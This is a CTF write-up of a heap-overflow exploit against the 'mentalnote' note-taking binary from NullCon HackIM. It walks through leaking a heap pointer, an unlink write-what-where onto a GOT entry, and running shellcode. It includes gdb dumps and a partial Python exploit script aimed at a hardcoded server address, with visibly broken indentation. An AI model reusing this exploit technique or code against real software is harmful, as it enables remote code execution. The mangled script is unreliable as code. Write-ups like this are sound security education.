### Solved by barrebas and superkojiman

`mentalnote` was a 400 point exploitation-type challenge in NullCon's HackIM CTF. Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:

```
~/tmp/nullcon/exp400$ ./MentalNote 
You want to store some Notes??
Well, we present you the Sherlock's MentalPad -->
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
```

superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note's meta-data. 

First, let's allocate two notes and set them to something to inspect the heap layout.

```

I located the second note in the heap using gdb-peda's `find` command.

```
gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
```

You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:

```c
struct note {
        note *next_note;
            note *prev_note;
                char note_content[MAX_LENGTH];
};
```

I sent a stupidly large input to overflow these notes:

```
gdb-peda$ r

```

The heap for note two now looks like this:

```
gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
```

We have overwritten the pointers. Furthermore, superkojiman noticed:

```
gdb-peda$ vmmap
Start      End        Perm  Name
<snip>
0x0804c000 0x0804e000 rwxp  [heap]
```

The heap is writeable **and** executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode. 

I recently tested c0ne's binaries for his Pandora's Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:

```
gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
```

When I know requested the value of note one, the binary would dump out lots of B's, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to `next_note` and `prev_note`. Then I'd ask the binary to delete a note. It does this by calling `free()`. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to `__isoc99_scanf@got.plt`. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of `__isoc99_scanf@got.plt`, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way `free()` works, we need to adjust the addresses a bit. 

The [shellcode](http://www.shell-storm.org/shellcode/files/shellcode-547.php) was modified a bit ('/bin/ash' -> '/bin//sh') and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a 'delete note' command.

The exploit:

```python
import struct
import socket
import time
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9004))

s.recv(1000)
time.sleep(0.5)

def p(x):
    return struct.pack('<L', x)

    payload  = "1\n1\n1\n1\n"   # create two notes of type one
    payload += "3\n0\n2\n"      # edit note 0 as type two

    s.send(payload)
    time.sleep(0.5)

# overflow note to line up to heap pointer
s.send("A"*212+"BBB\n")

time.sleep(0.5)
s.recv(256)

# leak heap addr
print "[+] Trying to leaking heap address..."
time.sleep(0.5)

s.send("4\n0\n")
time.sleep(0.5)

data = s.recv(1000)

# ugly.. but works :/
m = re.search(r'.*BBB\n(....).*', data)
if m:
        heap = struct.unpack('<L', m.group(1))[0]
            print "[+] Leaked heap address at {}".format(hex(heap))
                # offset for shellcode found empirically via gdb
                    shellcode = heap - 0xd0
                        print "[+] Shellcode at {}".format(hex(shellcode))
                        else:
                                print "[!] Fatal: could not leak heap address"
                                    exit(0)
                                        
                                        time.sleep(0.5)

time.sleep(0.5)
s.recv(1000)

time.sleep(0.5)
